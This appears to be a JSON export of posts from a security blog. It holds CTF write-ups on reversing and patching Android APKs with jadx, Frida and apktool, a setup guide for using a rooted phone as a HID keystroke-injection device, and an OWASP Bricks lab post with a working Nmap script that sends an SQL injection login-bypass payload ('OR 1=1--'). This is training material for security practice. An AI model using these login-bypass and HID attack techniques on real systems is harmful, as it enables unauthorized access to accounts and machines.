[{"content":"Challenge Description This app contains some unique keys. Can you get one?\nAPKey.apk\nSolution Static Analysis The first step is always static analysis. I started by using jadx-gui to see the decompiled Java code. Looking into the AndroidManifest.xml, it looks like there\u0026rsquo;s only one activity which is MainActivity.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;application android:theme=\u0026#34;@style/Theme.APKey\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:allowBackup=\u0026#34;true\u0026#34; android:supportsRtl=\u0026#34;true\u0026#34; android:roundIcon=\u0026#34;@mipmap/ic_launcher_round\u0026#34; android:appComponentFactory=\u0026#34;androidx.core.app.CoreComponentFactory\u0026#34;\u0026gt; \u0026lt;activity android:name=\u0026#34;com.example.apkey.MainActivity\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;/application\u0026gt; Since it\u0026rsquo;s gonna be MainActivity, we could have a look at the code. Inside the code, we have something interesting.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public void onClick(View view) { Toast makeText; String str; try { if (MainActivity.this.f928c.getText().toString().equals(\u0026#34;admin\u0026#34;)) { MainActivity mainActivity = MainActivity.this; b bVar = mainActivity.e; String obj = mainActivity.d.getText().toString(); try { MessageDigest messageDigest = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); messageDigest.update(obj.getBytes()); byte[] digest = messageDigest.digest(); StringBuffer stringBuffer = new StringBuffer(); for (byte b2 : digest) { stringBuffer.append(Integer.toHexString(b2 \u0026amp; 255)); } str = stringBuffer.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); str = \u0026#34;\u0026#34;; } if (str.equals(\u0026#34;a2a3d412e92d896134d9c9126d756f\u0026#34;)) { Context applicationContext = MainActivity.this.getApplicationContext(); MainActivity mainActivity2 = MainActivity.this; b bVar2 = mainActivity2.e; g gVar = mainActivity2.f; makeText = Toast.makeText(applicationContext, b.a(g.a()), 1); makeText.show(); } } makeText = Toast.makeText(MainActivity.this.getApplicationContext(), \u0026#34;Wrong Credentials!\u0026#34;, 0); makeText.show(); } catch (Exception e2) { e2.printStackTrace(); } } Looking into this part of the code, I could see there\u0026rsquo;s a string comparison for admin and a function that seems to be MD5 but the strings is 31 characters. Well since I have no idea, I decided to look into the toast.makeText as it seems like the function to get flag. It\u0026rsquo;s playing around b.a(g.a()).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 public class g { public static String a() { StringBuilder sb = new StringBuilder(); ArrayList arrayList = new ArrayList(); arrayList.add(\u0026#34;722gFc\u0026#34;); arrayList.add(\u0026#34;n778Hk\u0026#34;); arrayList.add(\u0026#34;jvC5bH\u0026#34;); arrayList.add(\u0026#34;lSu6G6\u0026#34;); arrayList.add(\u0026#34;HG36Hj\u0026#34;); arrayList.add(\u0026#34;97y43E\u0026#34;); arrayList.add(\u0026#34;kjHf5d\u0026#34;); arrayList.add(\u0026#34;85tR5d\u0026#34;); arrayList.add(\u0026#34;1UlBm2\u0026#34;); arrayList.add(\u0026#34;kI94fD\u0026#34;); sb.append((String) arrayList.get(8)); sb.append(h.a()); sb.append(i.a()); sb.append(f.a()); sb.append(e.a()); ArrayList arrayList2 = new ArrayList(); arrayList2.add(\u0026#34;ue7888\u0026#34;); arrayList2.add(\u0026#34;6HxWkw\u0026#34;); arrayList2.add(\u0026#34;gGhy77\u0026#34;); arrayList2.add(\u0026#34;837gtG\u0026#34;); arrayList2.add(\u0026#34;HyTg67\u0026#34;); arrayList2.add(\u0026#34;GHR673\u0026#34;); arrayList2.add(\u0026#34;ftr56r\u0026#34;); arrayList2.add(\u0026#34;kikoi9\u0026#34;); arrayList2.add(\u0026#34;kdoO0o\u0026#34;); arrayList2.add(\u0026#34;2DabnR\u0026#34;); sb.append((String) arrayList2.get(9)); sb.append(c.a()); ArrayList arrayList3 = new ArrayList(); arrayList3.add(\u0026#34;jH67k8\u0026#34;); arrayList3.add(\u0026#34;8Huk89\u0026#34;); arrayList3.add(\u0026#34;fr5GtE\u0026#34;); arrayList3.add(\u0026#34;Hg5f6Y\u0026#34;); arrayList3.add(\u0026#34;o0J8G5\u0026#34;); arrayList3.add(\u0026#34;Wod2bk\u0026#34;); arrayList3.add(\u0026#34;Yuu7Y5\u0026#34;); arrayList3.add(\u0026#34;kI9ko0\u0026#34;); arrayList3.add(\u0026#34;dS4Er5\u0026#34;); arrayList3.add(\u0026#34;h93Fr5\u0026#34;); sb.append((String) arrayList3.get(5)); sb.append(d.a()); sb.append(a.a()); return sb.toString(); } public static String b() { return String.valueOf(d.a().charAt(1)) + String.valueOf(i.a().charAt(2)) + String.valueOf(i.a().charAt(1)); } } Looking into g, there\u0026rsquo;s function a and b and function a seems to be something I want but it has a lot of random functions from different class.\nDynamic Analysis Since there\u0026rsquo;s a lot of random function, I decided to perform dynamic analysis by using frida to force executing the Java code. To do so, I\u0026rsquo;ll need to use objection to patch the APK.\n1 2 3 4 PS D:\\\u0026gt; objection patchapk -s .\\APKey.apk No architecture specified. Determining it using `adb`... Detected target device architecture as: arm64-v8a ... After patching and installing it to my devices, it should be ready to use. Since it is patched using objection, I\u0026rsquo;ll need to use frida to hook it to let the APK running as intended.\n1 2 3 4 5 6 7 8 9 10 11 12 frida -U -N com.example.apkey -l .\\frida.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) After hooking it, I could see the app working as intended.\nThis looks like it\u0026rsquo;s related to the function where it checks for admin and a weird 31 hash. Since this is useless, I then continue with what i wanted to do which is using frida to execute the Java function.\n1 2 3 4 5 Java.perform(()=\u0026gt; { let g = Java.use(\u0026#34;c.b.a.g\u0026#34;); let test = g.a(); console.log(\u0026#34;g.a() result = \u0026#34; + test); }); By using this frida script, I could instantly get the result of the Java code.\n1 2 [POCOPHONE F1::com.example.apkey ]-\u0026gt; %reload g.a() result = 1UlBm2kHtZuVrSE6qY6HxWkwHyeaX92DabnRFlEGyLWod2bkwAxcoc85S94kFpV1 This seems to be another weird strings which I have no idea what it is. I then remembered that the function is b.a(g.a()) which means this strings works as a key for b.a() functions. I then changed my script accordingly.\n1 2 3 4 5 6 7 8 Java.perform(()=\u0026gt; { let g = Java.use(\u0026#34;c.b.a.g\u0026#34;); let b = Java.use(\u0026#34;c.b.a.b\u0026#34;); let test = g.a(); console.log(\u0026#34;g.a() result = \u0026#34; + test); let result = b.a(test); console.log(\u0026#34;b.a() result = \u0026#34; + result); }); I then get some good result from the frida script.\n1 2 3 [POCOPHONE F1::com.example.apkey ]-\u0026gt; %reload g.a() result = 1UlBm2kHtZuVrSE6qY6HxWkwHyeaX92DabnRFlEGyLWod2bkwAxcoc85S94kFpV1 b.a() result = HTB{m0r3_0bfusc4t1on_w0uld_n0t_hurt} Things I learned from this challenge Frida Scripting ","permalink":"https://callmeks.github.io/posts/htb-apkey/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis app contains some unique keys. Can you get one?\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/APKey.apk\"\u003eAPKey.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eThe first step is always static analysis. I started by using \u003ccode\u003ejadx-gui\u003c/code\u003e to see the decompiled Java code. Looking into the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e, it looks like there\u0026rsquo;s only one activity which is \u003ccode\u003eMainActivity\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;application\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:theme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@style/Theme.APKey\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:label=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@string/app_name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:icon=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@mipmap/ic_launcher\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:allowBackup=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:supportsRtl=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:roundIcon=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@mipmap/ic_launcher_round\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:appComponentFactory=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;androidx.core.app.CoreComponentFactory\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.example.apkey.MainActivity\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/application\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eSince it\u0026rsquo;s gonna be \u003ccode\u003eMainActivity\u003c/code\u003e, we could have a look at the code. Inside the code, we have something interesting.\u003c/p\u003e","title":"HTB APKey"},{"content":"Challenge Description Welp, time to do it again.\nUnable to install? That is a part of the challenge, try to overcome it.\nAuthor: Trailbl4z3r \u0026amp; Monaruku\nhint: Tbh this is not a natively built app, more like something just wrapped into an app\nWorld-II.apk\nSolution Since it\u0026rsquo;s an APK file, Lets start with jadx-gui for static analysis. In terms of static analysis, it\u0026rsquo;s always best to check out AndroidManifest.xml first.\nBased on the code, there\u0026rsquo;s only one activity which is systems.altimit.rpgmakermv.WebPlayerActivity. Double click and see the activity code. There\u0026rsquo;s a lot of function in the WebPlayerActivity but I\u0026rsquo;ll be focusing on onCreate function first as that it is the starting point for all activities.\nAccording to the code, it is trying to construct the game by getting the value of id.application.rpgmakermv.R.string.mv_project_index. I then tried to have a look and search for the strings values. By using the global search feature in jadx-gui, I managed to get the strings value.\nNow that I know the value is //android_asset/www/index.html, my first thought is checking out for the files using the global search feature.\nWhile the index.html does not have a lot of code, I noticed that it\u0026rsquo;s using main.js. I then look for it and have a look in it.\nLooking into main.js, there\u0026rsquo;s a lot of code and several script as well. I then look into each of it and see which is interesting.\nLooking into rmmz_managers.js, I noticed that database file that are stored as json file. I then look into Actors.json as it seems like the game character\u0026rsquo;s database file.\nSince this is a json file, I think that I could modify the json file and repack the apk to make the me win easily. Since I have limited information at the moment, I tried to run the apk and see how the game works.\nHere\u0026rsquo;s how the main page looks like, which is similar to the index.html. I then started to play around to get more information.\nHere\u0026rsquo;s my current stat and equipment. I then look into the Actors.json to compare and identify which value I should modify. I noticed that the equip is the current weapon and body that the character has. The weapon database file is Weapons.json.\nThe id of the weapon is same as the number provided in equip in Actors.json. My next thought was to increase the damage of the weapon Dragon Blade since I could just edit the json file and repack it. While I have no idea, the params definitely consist the damage of the weapon. I then randomly edit every params into high value. To do so, I\u0026rsquo;ll need to unpack first.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS D:\\Desktop\\Android\\world2\u0026gt; apktool d .\\World_II.apk I: Using Apktool 2.10.0 on World_II.apk with 8 thread(s). I: Baksmaling classes.dex... I: Loading resource table... I: Decoding file-resources... I: Loading resource table from file: C:\\Users\\a\\AppData\\Local\\apktool\\framework\\1.apk I: Decoding values */* XMLs... I: Decoding AndroidManifest.xml with resources... I: Regular manifest package... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... Press any key to continue . . . After unpack the APK file, search for Weapons.json and modfiy the params value of Dragon Blade to 999. After modifying it, repack it.\n1 2 3 4 5 6 7 8 9 10 PS D:\\Desktop\\Android\\world2\u0026gt; apktool b .\\World_II\\ -o world-2-modified.apk I: Using Apktool 2.10.0 with 8 thread(s). I: Checking whether sources has changed... I: Smaling smali folder into classes.dex... I: Checking whether resources has changed... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk into: world-2-modified.apk Press any key to continue . . . After repacking the APK, remember to sign it. To do so, create a keystore.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS D:\\Desktop\\Android\\world2\u0026gt; keytool -genkey -v -keystore modify.keystore -alias modify_key -keyalg RSA -keysize 2048 -validity 10000 Enter keystore password: Re-enter new password: Enter the distinguished name. Provide a single dot (.) to leave a sub-component empty or press ENTER to use the default value in braces. What is your first and last name? What is the name of your organizational unit? What is the name of your organization? What is the name of your City or Locality? What is the name of your State or Province? What is the two-letter country code for this unit? Is CN=a, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct? [no]: yes Generating 2,048 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 10,000 days for: CN=a, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [Storing modify.keystore] After the keystore is created, sign the APK file.\n1 2 PS D:\\Desktop\\Android\\world2\u0026gt; apksigner sign --ks .\\modify.keystore .\\world-2-modified.apk Keystore password for signer #1: After that, Just run the game and hope everything is working.\nAs shown in image, I managed to change the weapon stats by modifying the params value. Now that my stats are high, I could easily win the game.\nAfter I win each boss, I\u0026rsquo;ll get a partial flag.\nFlag 1 Flag 2 Flag 3 Flag 4 This part of flag appear in the map after winning boss 4 Flag 5 After winning the boss, you will need to talk to a dude and it will give you 23 7 13 25 which is order of the alphabelt wgmy. Then a QR will be provided. 4f51785} Things I learned from this challenge reading code using static analysis patching the APK Cheat the game to win ","permalink":"https://callmeks.github.io/posts/wgmy2024-world-ii/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelp, time to do it again.\u003c/p\u003e\n\u003cp\u003eUnable to install? That is a part of the challenge, try to overcome it.\u003c/p\u003e\n\u003cp\u003eAuthor: Trailbl4z3r \u0026amp; Monaruku\u003c/p\u003e\n\u003cp\u003ehint:\nTbh this is not a natively built app, more like something just wrapped into an app\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/World_II.apk\"\u003eWorld-II.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eSince it\u0026rsquo;s an APK file, Lets start with \u003ccode\u003ejadx-gui\u003c/code\u003e for static analysis. In terms of static analysis, it\u0026rsquo;s always best to check out \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e first.\u003c/p\u003e","title":"WGMY2024 World II"},{"content":"Prerequisite a physical android devices rooted termux app As mentioned, the android devices must be rooted in order to work like a rubber ducky. I\u0026rsquo;ll be using my old devices that I have rooted as demonstration purposes.\nHere\u0026rsquo;s a quick evidence that my devices is rooted.\nSetting up Now that the android devices is rooted, I\u0026rsquo;ll need to download some useful files and application that has been created by others\nandroid usb gadget hid-gadget-test poc_pc_gadget Install the android usb gadget and prepare both the hid-gadget-test and poc_pc_gadget in your devices. After everything is ready, open the android usb gadget application.\nIt should have a popup where it ask about superuser rights. After that, scroll down and use the second option or add another one if there\u0026rsquo;s no second option. In the second option, add keyboard will do.\nAfter adding it, remember to turn on by pressing the \u0026ldquo;Gadget status\u0026rdquo; and process to android terminal (termux).\nMake sure to place the both the file in a same directory and both the file has execute permission.\nBasically, hid-gadget-test is a binary and poc_pc_gadget is a script.\nOne last thing is to take note is the /dev/hidg1. In some cases, the hidg number will be different make sure to have a look. Somehow, I\u0026rsquo;ll need to give all permission to everyone in order to make this works. /dev/hidg1 will only appear if you have turn on the \u0026ldquo;Gadget status\u0026rdquo;.\nSince it does not have execute permission by default, I\u0026rsquo;ll need to change the permission myself.\nAfter everything is done, I could just run the poc_pc_gadget to perform HID attack. remember to give it some try and error\nPOC Here\u0026rsquo;s a demonstration on how it works.\nReferences android usb gadget hid-gadget-test poc_pc_gadget youtube video ","permalink":"https://callmeks.github.io/posts/android-as-rubber-ducky/","summary":"\u003ch2 id=\"prerequisite\"\u003ePrerequisite\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003ea physical android devices\n\u003cul\u003e\n\u003cli\u003erooted\u003c/li\u003e\n\u003cli\u003etermux app\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAs mentioned, the android devices must be rooted in order to work like a rubber ducky. I\u0026rsquo;ll be using my old devices that I have rooted as demonstration purposes.\u003c/p\u003e\n\u003cp\u003eHere\u0026rsquo;s a quick evidence that my devices is rooted.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"alt text\" loading=\"lazy\" src=\"/posts/android-as-rubber-ducky/img/index.png#center\"\u003e\u003c/p\u003e\n\u003ch2 id=\"setting-up\"\u003eSetting up\u003c/h2\u003e\n\u003cp\u003eNow that the android devices is rooted, I\u0026rsquo;ll need to download some useful files and application that has been created by others\u003c/p\u003e","title":"Android as Rubber Ducky"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-5/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall5.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:51 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). PORT STATE SERVICE 80/tcp open http | chall1: | result: Succesfully logged in. | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;098f6bcd4621d373cade4e832627b4f6\u0026#39; | payload: | submit: Submit | username: a\u0026#39; OR 1=1-- a |_ passwd: test Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-5/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable 